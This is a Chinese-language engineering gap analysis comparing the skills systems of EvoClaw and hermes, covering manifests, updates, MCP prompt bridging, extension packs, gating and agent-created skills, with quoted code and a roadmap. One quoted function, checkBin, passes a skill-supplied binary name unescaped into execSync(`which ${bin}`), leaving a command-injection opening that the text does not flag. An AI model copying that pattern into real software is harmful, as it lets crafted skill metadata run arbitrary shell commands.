
---

### §3.10 用户修改保护（manifest v2 MD5）

**hermes**（`.research/12-skills-system.md §3.2 tools/skills_sync.py`）:

```python
# ~/.hermes/skills/.bundled_manifest v2 格式
dogfood/example:aaa111      # 每行 <relative_skill_path>:<origin_md5_hash>
research/arxiv:bbb222

def sync_skills():
    # 4 种状态处理：
    # NEW: 不在 manifest → 复制 + 记录
    # EXISTING 未改: user_md5 == manifest_md5 → 安全更新到 bundled 新版
    # EXISTING 已改: user_md5 ≠ manifest_md5 → 跳过更新（保护用户编辑）
    # DELETED: manifest 有但用户删了 → 尊重用户决定，不重加
    # REMOVED: bundled 消失 → 保留用户文件 + manifest
```

4 种状态机 + 原子写 manifest（`temp + os.replace`）+ 每次启动增量同步。

**EvoClaw** — **完全无**:

`grep -rn "\.bundled_manifest\|bundled-manifest\|skills_sync" packages/core/src` 零结果。

EvoClaw 的 bundled 技能是**编译到包内的静态资源**（`packages/core/src/skill/bundled/`），运行时直接从包内读取（`tool-registry.ts:60-65 BUNDLED_SKILLS_DIR`），用户无法编辑本地副本（也就不需要 MD5 保护）。`~/.evoclaw/skills/` 只存 clawhub/github 安装的技能。

```typescript
// tool-registry.ts:60-65 bundled 直接从编译产物读取
export const BUNDLED_SKILLS_DIR = path.resolve(
  typeof import.meta.dirname === 'string' ? import.meta.dirname : path.dirname(new URL(import.meta.url).pathname),
  '..', '..', 'skill', 'bundled',
);
```

**判定 🔴**：
- EvoClaw 的设计**规避了 hermes 该问题的根源**（bundled 不同步到用户目录），所以"不需要" manifest v2
- 但如果未来 EvoClaw 从远程更新 clawhub/github 装入的技能（当前**无更新路径**，只能卸载重装，见 §3.11），用户的本地编辑会被直接覆盖
- 风险：长期看 Hub 生态繁荣后，用户可能想"基于上游技能做本地微调" → 更新时会被覆盖丢失，需要类似 manifest v2 的保护
- 评估：短期不影响（因为没有"更新"流程），中期（Hub 生态起来）会暴露为硬伤

---

### §3.11 更新/删除/版本管理

**hermes** — 无业务层"更新"，但 `skills_sync.py` 是"bundled → 用户目录"的增量同步基础设施（保护用户编辑的 manifest v2）。`skill_manage(action="delete")` 支持删除。`frontmatter.version` 是存在的字段但 hermes 未在代码中做版本比对（`.research/12-skills-system.md §7 延伸阅读` "hermes 如何处理版本升级？用户本地编辑过的 skill 在 Hub 有新版时是否提示？" 是公开未解之谜）。

**EvoClaw**（`packages/core/src/skill/skill-installer.ts:134-143` + `packages/core/src/routes/skill.ts:99-111`）:

```typescript
// skill-installer.ts:134-143 卸载
uninstall(name: string, agentId?: string): boolean {
  const targetDir = agentId
    ? path.join(this.skillsBaseDir, '..', 'agents', agentId, 'workspace', 'skills', name)
    : path.join(this.skillsBaseDir, name);
  if (!fs.existsSync(targetDir)) return false;
  fs.rmSync(targetDir, { recursive: true, force: true });
  return true;
}

// skill-installer.ts:111-114 confirm 时如果已存在则直接删除旧版
if (fs.existsSync(targetDir)) {
  fs.rmSync(targetDir, { recursive: true, force: true });
}
```

特点:
- **卸载**支持（REST DELETE /skill/:name）
- **"更新"流程**：prepare 同名技能 + confirm → `confirm()` 内部直接 `rmSync` 旧目录再 renameSync 新目录（**覆盖式，无 diff 提示**）
- **无版本比对** — `SkillMetadata.version` 字段只是元数据展示用，无任何升级检测逻辑
- **无回滚** — 覆盖后旧版不存在，`grep -r "rollback\|snapshot\|backup" packages/core/src/skill` 零结果

**判定 🔴**：
- EvoClaw 无专门"更新"API（间接走 prepare+confirm 同名覆盖，用户看不到新老 diff）
- 无版本比对逻辑，无法主动告知"有新版"
- 无回滚能力
- hermes 的 manifest v2 是"更新保护"基础设施（虽然也没有业务层更新），EvoClaw 连这层基础都没有

---

### §3.12 MCP Prompt 桥接

**hermes** — **无**。

`skills/mcp/` 是给 MCP 工具写的"使用指南"markdown，不是 MCP prompts 自动桥接。`.research/12-skills-system.md §7 延伸阅读` 明确："一些 skill 是为 MCP 工具写的'使用指南'（`skills/mcp/`），具体结构如何？Phase C3 `21-mcp.md` 会讲" — 这是**手写 skill 描述怎么用 MCP 工具**，不是从 MCP 服务器自动拉 prompts。

**EvoClaw**（`packages/core/src/mcp/mcp-prompt-bridge.ts:23-43` + `packages/core/src/context/plugins/tool-registry.ts:127-134` + `packages/core/src/skill/skill-tool.ts:115-118`）:

```typescript
// mcp-prompt-bridge.ts:23-36
export function mcpPromptToSkill(prompt: McpPromptInfo): InstalledSkill {
  const skillName = `mcp:${prompt.serverName}:${prompt.name}`;
  return {
    name: skillName,
    description: prompt.description ?? `MCP prompt from ${prompt.serverName}`,
    source: 'mcp',
    installPath: `mcp://${prompt.serverName}/${prompt.name}`,
    gatesPassed: true,    // MCP 服务器已连接即视为门控通过
    disableModelInvocation: false,
    executionMode: 'inline',
  };
}

// tool-registry.ts:127-134 — 在 beforeTurn 合并
if (opts.mcpPromptsProvider) {
  const seen = new Set(skills.map(s => s.name));
  const mcpSkills = opts.mcpPromptsProvider().filter(s => !seen.has(s.name));
  if (mcpSkills.length > 0) {
    skills = [...skills, ...mcpSkills];
  }
}

// skill-tool.ts:115-118 — 调用时路由
if (skillName.startsWith('mcp:') && options?.mcpPromptExecutor) {
  return handleMcpPrompt(skillName, args, options.mcpPromptExecutor);
}
```

整个链路:
1. MCP 客户端连接服务器后调 `listPrompts()` 获取可用 prompts
2. `bridgeAllMcpPrompts()` 批量转换为 `InstalledSkill` 列表（`source: 'mcp'`）
3. `ToolRegistry` 在 `beforeTurn` 把 MCP skill 合并进 Tier 1 目录（同名本地技能覆盖）
4. LLM 调 `invoke_skill({ skill: "mcp:server:prompt", args: "..." })` → `handleMcpPrompt` 路由到 MCP SDK `getPrompt()`
5. MCP prompt 内容作为 tool_result 注入

**判定 🟢 反超**：hermes 无任何对应机制。EvoClaw 独有把 MCP prompts 整合进 skill 目录的桥接设计（CLAUDE.md L81-82 "MCP Prompt 桥接: MCP 服务器 listPrompts() 自动注册为 `mcp:{serverName}:{promptName}` 技能，出现在 available_skills 目录"）。

---

### §3.13 企业扩展包 / 一键安装

**hermes** — **无**。

hermes 的"批量安装"是用户逐个 `hermes skills install <name>` 或 `browse --source official` 选择，无"扩展包"概念。

**EvoClaw**（`packages/core/src/extension-pack/pack-parser.ts:31-81` + `packages/core/src/extension-pack/pack-installer.ts` + `packages/core/src/extension-pack/pack-registry.ts`）:

```typescript
// pack-parser.ts:23-80
const MAX_UNZIP_SIZE = 50 * 1024 * 1024;   // 50MB
const MAX_FILE_COUNT = 500;
const MANIFEST_FILENAME = 'evoclaw-pack.json';

export async function parseExtensionPack(zipPath: string): Promise<ParsedExtensionPack> {
  // 1. 解压到临时目录（unzip -o -q）
  // 2. 安全检查：总大小 ≤ 50MB / 文件数 ≤ 500
  // 3. 读取 evoclaw-pack.json manifest
  // 4. Zod safeParse manifest schema
  // 5. 返回 { manifest, tempDir, skillDirs, errors }
}
```

manifest 结构（CLAUDE.md "企业扩展包: evoclaw-pack.json manifest + skills/ 子目录 ZIP 打包，一键安装 skills + MCP servers + 安全策略合并"）:
- skills/ 子目录中的多个技能
- MCP servers 配置
- 安全策略（自动 merge 到现有 NameSecurityPolicy）

安装流程:
1. ZIP 上传 → `parseExtensionPack()` 校验 + 解压
2. `pack-installer.ts` 执行：
   - 逐个 skill 走安全扫描 + 安装
   - MCP servers 合并到 `packages/core/src/mcp/mcp-config.ts` 配置
   - `mergeSecurityPolicies(base, overlay)` 合并安全策略（见 §3.9）

**判定 🟢 反超**：hermes 无任何对应机制。EvoClaw 独有企业扩展包设计（CLAUDE.md L84 "evoclaw-pack.json manifest + skills/ 子目录 ZIP 打包"），对"IT 管理员一键下发团队技能库 + MCP 配置 + 安全策略"场景特别有价值（CLAUDE.md "面向企业级用户非开发者" 定位）。

---

### §3.14 门控（requires.bins/env/os）

**hermes**（`.research/12-skills-system.md §3.3 skill_utils.py:92-115`）:

仅 `platforms` 字段做 OS 过滤:

```python
def skill_matches_platform(platforms: List[str]) -> bool:
    if not platforms: return True
    mapping = {"macos": "darwin", "osx": "darwin", "windows": "win32"}
    normalized = {mapping.get(p.lower(), p.lower()) for p in platforms}
    current = sys.platform.lower()
    return current in normalized or any(current.startswith(p) for p in normalized)
```

无 bin 检查（`which`）、无 env 检查。

**EvoClaw**（`packages/core/src/skill/skill-gate.ts:12-86`）:

```typescript
// skill-gate.ts:12-35 — 完整三类门控
export function checkGates(metadata: SkillMetadata): SkillGateResult[] {
  const requires = metadata.requires;
  if (!requires) return [];
  const results: SkillGateResult[] = [];
  if (requires.bins) {
    for (const bin of requires.bins) results.push(checkBin(bin));    // which <bin>
  }
  if (requires.env) {
    for (const envVar of requires.env) results.push(checkEnv(envVar));  // process.env[envVar]
  }
  if (requires.os) results.push(checkOs(requires.os));
  return results;
}

// L43-55 — 二进制检查
function checkBin(bin: string): SkillGateResult {
  try { execSync(`which ${bin}`, { stdio: 'pipe' }); return { type: 'bin', name: bin, satisfied: true }; }
  catch { return { type: 'bin', name: bin, satisfied: false, message: `未找到命令: ${bin}` }; }
}

// L69-86 — OS 检查（含平台名规范化）
function checkOs(supportedOs: string[]): SkillGateResult {
  const platformMap: Record<string, string> = { darwin: 'macos', win32: 'windows', linux: 'linux' };
  const current = platformMap[process.platform] ?? process.platform;
  const satisfied = supportedOs.some(os =>
    os.toLowerCase() === current || os.toLowerCase() === process.platform,
  );
  return { type: 'os', name: process.platform, satisfied, message: satisfied ? undefined : `...` };
}
```

门控决定 Tier 1 注入：`tool-registry.ts:140` `skills.filter(s => s.gatesPassed && ...)` — 未通过门控的技能不进入目录。

**判定 🟢 反超**:
- EvoClaw 实现 **bins / env / os 三类门控**，hermes 只有 `platforms` OS 过滤
- EvoClaw 在 SKILL.md frontmatter 声明 `requires` 字段（`skill-gate.ts:5-9 注释` "PI/AgentSkills 规范本身不实现门控，EvoClaw 作为自定义扩展实现"）
- CLAUDE.md L78 "Skill 门控：AgentSkills 规范不实现 requires.bins/env/os 门控，EvoClaw 作为自定义扩展实现"
- 门控结果在 UI 中可见（`skill-discoverer.ts:226-272 listLocalWithGates()` 返回 gateResults 详情）

---

### §3.15 Agent 自主创建 skill

**hermes**（`.research/12-skills-system.md §3.5 skill_manager_tool.py:279-333` + `SKILL_MANAGE_SCHEMA` L645-653）:

```python
# SKILL_MANAGE_SCHEMA.description 是系统 prompt 的一部分 — LLM 看到它会知道"何时该主动 create"
"""
Create a new skill when:
- Complex task succeeded with 5+ tool calls
- You overcame errors through trial-and-fix
- User provided a correction that you should remember
- You discovered a non-trivial new workflow
- User explicitly asked: "remember this procedure"
"""

def _create_skill(name, category, content):
    # 1. 验证 name (max 64 chars, lowercase + hyphens)
    # 2. 验证 category / frontmatter / size (<100k)
    # 3. 冲突检查
    # 4. 原子写入 SKILL.md
    # 5. skills_guard 安全扫描（agent-created 和 Hub 安装一样的扫描）
    # 6. 失败回滚（shutil.rmtree）
    # 7. clear_skills_system_prompt_cache() — invalidate cache
```

**6 个 action**: `create` / `edit` / `patch` / `delete` / `write_file` / `remove_file`。

**EvoClaw** — **完全缺失**:

- `grep -rn "skill_manage\|_create_skill\|create_skill\|agent.*create.*skill" packages/core/src` 零结果
- `bundled/skill-creator/SKILL.md` 是**给人类用户看的创建指南**（`whenToUse: "User wants to create a new skill or update an existing skill"` — 触发条件是"用户想"，不是"agent 任务完成后自主决定"），不是 agent 自主创建基础设施
- 无 `skill_manage` 工具注册（`grep -rn "skill_manage\|manage.*skill" packages/core/src/agent/kernel/builtin-tools.ts` 零结果）

**判定 🔴**：
- EvoClaw 完全缺失"agent 自主创建 skill"能力
- hermes 的"5+ tool calls / 错误恢复 / 用户修正 / 新工作流"四类触发是 **agent 自进化**的重要基础（agent 从执行中学习 → 沉淀为新技能 → 下次复用）
- 与 CLAUDE.md 项目定位"自进化 AI 伴侣" 理念有显著 gap
- 补齐需 1-2 人周（需要 schema 设计 / 验证规则 / 原子写 / 安全扫描回滚 / 缓存失效）

---

### §3.16 模型降级（fork 时使用 skill 声明的 model）

**hermes** — 无此概念。所有 skill 共享主 agent 的模型配置。

**EvoClaw**（`packages/core/src/skill/skill-tool.ts:39-56, 175-204`）:

```typescript
// skill-tool.ts:39-40
export type ModelResolverFn = (modelRef: string) => ResolvedModelConfig | undefined;

// skill-tool.ts:175-204 — handleForkExecution
async function handleForkExecution(
  skillName, body, description, args, forkConfig,
  skillModel?: string,       // 来自 SKILL.md 的 model 字段
  modelResolver?: ModelResolverFn,
) {
  // 尝试使用 skill 指定的模型，未配置时降级为当前默认模型
  let apiConfig = forkConfig.apiConfig;
  if (skillModel && modelResolver) {
    const resolved = modelResolver(skillModel);
    if (resolved) apiConfig = resolved;
    // 未解析到 → 静默降级，使用默认模型
  }
  const result = await forkExecuteSkill({ ..., apiConfig });
  // ...
}
```

**SKILL.md 示例声明**:

```yaml
---
name: deep-research-pro
description: ...
execution-mode: fork
model: anthropic/claude-opus   # 声明用 Opus 跑深度研究
---
```

优先级链: skill 声明的 model → modelResolver 解析 → 命中则用（如用户配了 anthropic/claude-opus）→ 未命中静默降级到当前主模型。

**判定 🟢 反超**：
- hermes 无对应机制
- EvoClaw 独有设计（CLAUDE.md L76 "Skill model 字段: SKILL.md 可指定 `model: provider/modelId`，fork 执行时优先使用指定模型，未配置时静默降级为当前默认模型"）
- 对"不同复杂度 skill 跑不同模型"场景友好（代码审查用 Opus / 简单检索用 Haiku），**成本感知**设计
- **静默降级**对企业用户友好（用户没配指定 provider 不会报错中断）
- 仅 fork 模式生效（inline 模式没有独立 LLM 调用概念）

---

## 4. 建议改造蓝图（不承诺实施）

**P0**（高 ROI，建议尽快）:

| # | 项目 | 对应差距 | 工作量 | ROI | 价值 |
|---|---|---|---|---|---|
| 1 | 威胁扫描模式库扩展（keystore / exfiltration / DNS tunneling / persistence 4 类） | §3.9 | 1-2d | 🔥🔥 | 企业安全基线对齐，补齐 hermes 的 8 类威胁检测 |
| 2 | Trust level 分级 + INSTALL_POLICY 决策矩阵 | §3.9 | 1d | 🔥🔥 | 区分 bundled / clawhub / github / mcp 不同信任级，细化自动拒绝策略 |
| 3 | Skill 版本比对 + "有新版可用"提示 | §3.11 | 1-2d | 🔥 | Hub 生态繁荣前置基础，至少能告知用户"装了 1.0，上游有 2.0" |

**P1**（中等 ROI）:

| # | 项目 | 对应差距 | 工作量 | ROI | 价值 |
|---|---|---|---|---|---|
| 4 | Agent 自主创建 skill（skill_manage 工具 + 5+ tool-call 触发 schema） | §3.15 | 5-8d | 🔥🔥 | 支撑"自进化 AI 伴侣"定位，agent 从执行中学习沉淀 |
| 5 | 支持 `references/ templates/ scripts/ assets/` 目录列出 | §3.1 | 1d | 🔥 | 对齐 AgentSkills 规范的 support files，skill 可引用辅助资源 |
| 6 | GitHub 认证分级（PAT + gh CLI + GitHub App JWT） | §3.8 | 2-3d | 🔥 | 解决匿名 60 req/hr 限速问题 |
| 7 | 递归扫描（支持 `skills/<category>/<name>/SKILL.md` 布局） | §3.3 | 0.5d | 🔥 | 允许按分类组织 skill，与 hermes `skills/research/arxiv/` 风格对齐 |
| 8 | MD5 manifest 用户修改保护（仅针对 clawhub/github 更新流程） | §3.10 | 2-3d | 🔥 | 为未来更新流程铺路，保护用户本地编辑 |

**P2**（长期规划）:

| # | 项目 | 对应差距 | 工作量 |
|---|---|---|---|
| 9 | `metadata.hermes.config` 等价字段（skill 级用户配置收集 + setup 向导） | §3.1 | 3-4d |
| 10 | `setup.collect_secrets` 等价（装 skill 时收集 API key 到加密存储） | §3.1 | 3-5d |
| 11 | Skill 回滚机制（装新版前快照旧版） | §3.11 | 2d |

**不建议做**:
- 把激活模型改为"user message 注入"（§3.2）：EvoClaw 的 Tier 1/Tier 2 模型与 CLAUDE.md 定位一致，不应反向。可以**增加**用户显式激活入口作为补充，但不应替换。
- 4 档信任级别全套复刻（§3.9）：EvoClaw 已有 allowlist/denylist 覆盖 IT 管理员场景，trust level 的增量价值在当前生态规模下不足以 justify 重构成本。先落 P0 第 2 项的轻量分级即可。

---

## 5. EvoClaw 反超点汇总

| # | 反超项 | 证据位置 | hermes 对应 |
|---|---|---|---|
| 1 | 5 种来源（bundled/local/clawhub/github/mcp） | `packages/shared/src/types/skill.ts:60` / `tool-registry.ts:189-205` | 4 种（builtin/外部/GitHub/agent-created），无 MCP 桥接 |
| 2 | Tier 1 XML 目录 + Tier 2 按需加载（2 级渐进式） | `tool-registry.ts:171, 288-386` / `skill-tool.ts:106-148` | 仅工具级 `skills_list + skill_view` |
| 3 | inline / fork 双执行模式 | `skill-tool.ts:137-143` / `skill-fork-executor.ts:49-160` | 无执行模式分离概念 |
| 4 | Bundled 技能编译到包内（零同步成本） | `tool-registry.ts:60-65` / `bundled/` 30 个技能 | 依赖 `skills_sync.py` 运行时同步 |
| 5 | `model: provider/modelId` 字段 + fork 时模型降级 | `skill-tool.ts:175-204` / `types/skill.ts:33` | 无 |
| 6 | MCP Prompt 自动桥接为技能 | `mcp-prompt-bridge.ts:23-43` / `tool-registry.ts:127-134` | 无 |
| 7 | 企业扩展包 `evoclaw-pack.json` + ZIP 一键安装 | `extension-pack/pack-parser.ts:31-81` | 无 |
| 8 | NameSecurityPolicy（allowlist/denylist/disabled）统一覆盖 Skills + MCP | `security/extension-security.ts:15-71` | 仅 skills.disabled 单维度，不覆盖 MCP |
| 9 | `requires.bins/env/os` 三类门控 | `skill-gate.ts:12-86` | 仅 `platforms` OS 过滤 |
| 10 | 两步 prepare→confirm 交互式安装 + high risk 自动拒绝 | `skill-installer.ts:37-122` | CLI 一步式安装，无 high risk 自动拒绝 |
| 11 | Agent 级 vs 用户级双安装范围 | `skill-installer.ts:108-110` | 仅用户级 |
| 12 | `whenToUse` / `argument-hint` / `arguments` / `execution-mode` 4 个 XML 子节点引导精准触发 | `tool-registry.ts:378-386` / `types/skill.ts:28-46` | 仅 `tags` 分类无触发提示 |
| 13 | Tier 1 紧凑模式自动降级 + bundled 豁免 | `tool-registry.ts:313-369` | 无 prompt 预算管理 |
| 14 | `mergeSecurityPolicies` 企业扩展包安全策略合并（denylist 并集 / allowlist 交集） | `security/extension-security.ts:81-110` | 无扩展包概念 |

---

## 6. 附录：引用验证

### 6.1 EvoClaw 代码引用抽样（本章所有 `path:line` 均经 Read 工具验证 2026-04-16）

- `packages/core/src/skill/skill-parser.ts:20-53` ✅ parseSkillMd 主入口（YAML frontmatter + body）
- `packages/core/src/skill/skill-parser.ts:139-183` ✅ SkillMetadata 字段映射（含 executionMode / whenToUse / model / argumentHint / arguments / requires）
- `packages/core/src/skill/skill-parser.ts:41-50` ✅ G2 inline 模式 allowedTools warn
- `packages/core/src/skill/skill-discoverer.ts:62-187` ✅ SkillDiscoverer（browse + search + getSkillInfo）
- `packages/core/src/skill/skill-discoverer.ts:25-31` ✅ SKILL_STORE_API / CLAWHUB_API / CACHE_TTL_MS
- `packages/core/src/skill/skill-discoverer.ts:190-272` ✅ listLocal + listLocalWithGates（含门控详情）
- `packages/core/src/skill/skill-installer.ts:37-122` ✅ prepare → confirm 两步安装
- `packages/core/src/skill/skill-installer.ts:146-197` ✅ downloadFromClawHub ZIP / downloadFromGitHub git clone
- `packages/core/src/skill/skill-tool.ts:64-152` ✅ createSkillTool + invoke_skill handler
- `packages/core/src/skill/skill-tool.ts:137-143` ✅ effectiveMode = modeOverride ?? executionMode ?? 'inline'
- `packages/core/src/skill/skill-tool.ts:175-204` ✅ handleForkExecution + model 降级
- `packages/core/src/skill/skill-fork-executor.ts:49-159` ✅ MAX_FORK_TURNS + 独立 LLM 调用
- `packages/core/src/skill/skill-gate.ts:12-86` ✅ checkGates bins/env/os
- `packages/core/src/skill/skill-analyzer.ts:19-26` ✅ DANGER_PATTERNS 6 类正则
- `packages/core/src/skill/skill-analyzer.ts:80-102` ✅ analyzeSkillSecurity + riskLevel 判定
- `packages/core/src/skill/skill-arguments.ts:41-77` ✅ substituteArguments ${name}/$ARGUMENTS[N]/$N
- `packages/core/src/context/plugins/tool-registry.ts:40-43` ✅ MAX_SKILLS_IN_PROMPT = 150 / MAX_SKILLS_PROMPT_CHARS = 30000
- `packages/core/src/context/plugins/tool-registry.ts:60-72` ✅ BUNDLED_SKILLS_DIR 常量 + DEFAULT_PATHS 三级
- `packages/core/src/context/plugins/tool-registry.ts:111-176` ✅ bootstrap + beforeTurn（扫描 + 合并 MCP + 安全策略 + bundled 豁免 + Tier 1 注入）
- `packages/core/src/context/plugins/tool-registry.ts:190-205` ✅ scanSkills 三级目录优先级
- `packages/core/src/context/plugins/tool-registry.ts:288-386` ✅ buildSkillsPrompt（完整 / bundled 豁免 / compact / 截断 4 级降级）
- `packages/core/src/context/plugins/tool-registry.ts:378-386` ✅ skillToFullEntry（含 mode/when/hint/arguments 4 个 XML 子节点）
- `packages/core/src/mcp/mcp-prompt-bridge.ts:23-43` ✅ mcpPromptToSkill + bridgeAllMcpPrompts
- `packages/core/src/security/extension-security.ts:15-71` ✅ evaluateAccess + filterByPolicy
- `packages/core/src/security/extension-security.ts:81-110` ✅ mergeSecurityPolicies（denylist 并集 / allowlist 交集 / disabled 并集）
- `packages/core/src/extension-pack/pack-parser.ts:18-81` ✅ parseExtensionPack（MAX_UNZIP_SIZE 50MB + MAX_FILE_COUNT 500）
- `packages/core/src/routes/skill.ts:18-125` ✅ browse / search / prepare / confirm / list / uninstall / refresh-cache REST 路由
- `packages/core/src/skill/bundled/` ✅ 30 个 bundled 技能目录（agent-browser-clawdbot / deep-research-pro / skill-creator / skill-finder-cn / skill-vetter / 等）
- `packages/shared/src/types/skill.ts:1-147` ✅ SkillMetadata + SkillSource + SkillExecutionMode + InstalledSkill 等类型定义

### 6.2 hermes 研究引用（章节 §）

- `.research/12-skills-system.md §1` 角色与定位（skill = 程序性记忆，4 种生命周期角色）
- `.research/12-skills-system.md §2` 数据结构 mermaid（来源 → 磁盘 → 运行时 → Hub → 安全 → 同步 → 工具）
- `.research/12-skills-system.md §3.1` skills/ 目录结构与 SKILL.md 格式（26 + 13 分类 / YAML frontmatter 字段）
- `.research/12-skills-system.md §3.2` skills_sync.py manifest v2 + MD5 用户修改保护
- `.research/12-skills-system.md §3.3` scan_skill_commands() / _load_skill_payload() / _build_skill_message()
- `.research/12-skills-system.md §3.4` skill_utils.py 辅助工具（parse_frontmatter / skill_matches_platform / get_disabled_skill_names / get_external_skills_dirs / extract_skill_config_vars）
- `.research/12-skills-system.md §3.5` skill_manager_tool.py 6 个 action + SKILL_MANAGE_SCHEMA 触发条件描述
- `.research/12-skills-system.md §3.6` skills_tool.py skills_list + skill_view progressive disclosure
- `.research/12-skills-system.md §3.7` skills_hub.py GitHub 认证 4 级 + SkillSource 抽象 + trust level
- `.research/12-skills-system.md §3.8` skills_guard.py 8 大类威胁模式 + INSTALL_POLICY 4x3 矩阵
- `.research/12-skills-system.md §3.9` hermes_cli/skills_config.py（hermes skills CLI + curses UI）
- `.research/12-skills-system.md §3.10` index-cache TTL 3600s + Nix 构建排除
- `.research/12-skills-system.md §3.11` 扫描 + 注入时序 sequenceDiagram
- `.research/12-skills-system.md §4.1` Skill 完整生命周期伪代码
- `.research/12-skills-system.md §4.2` Manifest v2 4 状态表（NEW / EXISTING 未改 / EXISTING 已改 / DELETED / REMOVED）
- `.research/12-skills-system.md §5` 与其它模块的交互（02 repo-layout / 07 prompt-system / 13 plugins / 29 security-approval / 30 build-packaging / 28 config-system）
- `.research/12-skills-system.md §6` 复刻清单
- `.research/12-skills-system.md §7` 延伸阅读（未解之谜：skills/dogfood/ / .hub 路径 / version 升级处理 / related_skills / collect_secrets 存储 / 贡献方向 / performance）

### 6.3 关联差距章节（crosslink）

本章的配套深入见：

- [`04-core-abstractions-gap.md`](./04-core-abstractions-gap.md) — Skill 相关类型（InstalledSkill / SkillMetadata / SkillSource）在核心抽象中的位置
- [`05-agent-loop-gap.md`](./05-agent-loop-gap.md) — query-loop 中的 Tier 1 注入 / invoke_skill 工具 dispatch 如何接入
- [`10-toolsets-gap.md`](./10-toolsets-gap.md) — Skills 作为 toolset 注册的位置（5 阶段工具注入）+ Tier 1/Tier 2 在 toolset 体系里的角色
- [`13-plugins-gap.md`](./13-plugins-gap.md) — ToolRegistry 作为 ContextPlugin 在 5-hook 生命周期中的位置（bootstrap → beforeTurn → compact → afterTurn → shutdown）
- `21-mcp-gap.md`（Phase C3，未写）— MCP Prompt 桥接（`mcp-prompt-bridge.ts`）的 MCP SDK `listPrompts()` / `getPrompt()` 集成
- `29-security-approval-gap.md`（Phase F，未写）— `skills_guard` 威胁模式库 vs EvoClaw `DANGER_PATTERNS` 详细对比 + NameSecurityPolicy 企业安全策略

---

**本章完成**。核心发现：EvoClaw Skills 系统在**生态丰富度**（5 来源）、**注入模型**（Tier 1 XML + Tier 2 按需）、**执行模式分离**（inline/fork）、**模型降级**（fork 时 skill 声明 model）、**MCP 桥接**（自动把 prompts 注册为技能）、**企业扩展包**（evoclaw-pack.json）、**统一安全策略**（allowlist/denylist/disabled 覆盖 Skills + MCP）、**门控系统**（bins/env/os 三类）8 个维度显著反超 hermes；但缺失 **agent 自主创建 skill**（hermes 的 5+ tool-call / 错误恢复 / 用户修正触发机制是自进化核心能力）、**manifest v2 用户编辑保护**（未来 Hub 更新流程的基础设施）、**更新/版本管理**（无版本比对 / 无回滚）3 个维度。后续 P0 建议补齐威胁扫描模式库 + trust level 分级 + 版本比对。P1 核心是"agent 自主创建"补齐，与"自进化 AI 伴侣"定位直接相关。
